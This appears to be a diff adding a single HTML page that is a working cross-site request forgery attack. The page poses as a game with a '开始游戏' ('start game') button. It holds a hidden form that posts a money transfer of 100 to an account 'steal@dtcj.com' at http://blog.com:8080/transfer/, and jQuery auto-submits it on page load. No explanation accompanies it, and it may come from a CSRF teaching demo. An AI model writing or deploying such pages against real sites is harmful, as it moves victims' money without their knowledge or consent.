@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
+
+</head>
+<body>
+<form action="http://blog.com:8080/transfer/" method="post" id="form">
+    <table>
+        <tbody>
+            <tr>
+                <td></td>
+                <td><input type="hidden" name="email" value="steal@dtcj.com"></td>
+            </tr>
+
+            <tr>
+                <td></td>
+                <td><input type="hidden" name="money" value="100"> </td>
+            </tr>
+            <tr>
+                <td></td>
+                <td><input type="submit" value="开始游戏"></td>
+            </tr>
+        </tbody>
+    </table>
+</form>
+
+<script>
+    $(function () {
+        $("#form").submit()
+    });
+</script>
+</body>
+</html>
